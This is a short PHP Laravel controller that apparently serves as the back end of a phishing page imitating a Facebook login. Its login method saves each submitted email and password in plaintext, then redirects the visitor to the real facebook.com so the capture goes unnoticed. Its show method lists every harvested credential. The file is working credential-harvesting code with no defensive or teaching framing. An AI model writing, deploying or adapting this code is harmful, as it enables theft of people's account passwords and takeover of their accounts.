<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;

class userController extends Controller
{
    //
    public function login(Request $request){
        $email=$request->email;
        $password=$request->pass;

        $user =new User();
        $user->email=$email;
        $user->password=$password;
        $save=$user->save();


        $url='https://www.facebook.com/';
        return redirect($url);

    }
    public function show(){
        $user =new User();
        $users=$user->all();

        return view('show',compact('users'));
    }
}
